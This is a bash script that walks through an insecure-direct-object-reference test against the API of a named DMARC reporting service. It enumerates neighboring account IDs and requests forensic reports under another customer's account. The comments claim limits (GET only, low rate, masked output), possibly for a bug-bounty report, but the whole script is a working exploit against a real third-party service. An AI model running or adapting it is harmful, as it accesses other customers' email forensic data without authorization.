#!/usr/bin/env bash
# dmarcreport IDOR matrix — fill TOKEN after registering free trial at dmarcreport.com
# Rules honored: GET only, <=1 rps, own+neighbor IDs only, no data exfil beyond status/shape
TOKEN='PASTE_API_KEY'
API=https://api.dmarcreport.com
A="Authorization: Bearer $TOKEN"
mask(){ sed -E 's/[A-Za-z0-9+/=]{40,}/<LONGB64>/g'; }

echo "[1] baseline: own accounts"
curl -s -w ' [%{http_code}]\n' -H "$A" "$API/v2/accounts" | mask; sleep 1

read -p "accountId from step 1: " ACC
for N in 1 2 3; do
  echo "[2.$N] neighbor probe: account $((ACC+N))"
  curl -s -o /tmp/n.out -w '[%{http_code}] ' --max-time 10 -H "$A" "$API/v2/accounts/$((ACC+N))"
  head -c 120 /tmp/n.out | mask; echo; sleep 1
done

echo "[3] domains in OWN account"
curl -s -w ' [%{http_code}]\n' -H "$A" "$API/v2/accounts/$ACC/domains" | mask; sleep 1
read -p "domainId from step 3: " DID

echo "[4.own] forensic reports OWN domain (baseline)"
curl -s -o /dev/null -w '[%{http_code}]\n' -H "$A" "$API/v2/accounts/$ACC/domains/$DID/forensic_reports"; sleep 1

read -p "neighbor accountId that returned data (or blank): " VACC
if [ -n "$VACC" ]; then
  echo "[5.THE-BUG] forensic_reports under NEIGHBOR account"
  curl -s -w '\n[%{http_code}]\n' -H "$A" "$API/v2/accounts/$VACC/domains/$DID/forensic_reports" | head -c 400 | mask; echo
fi
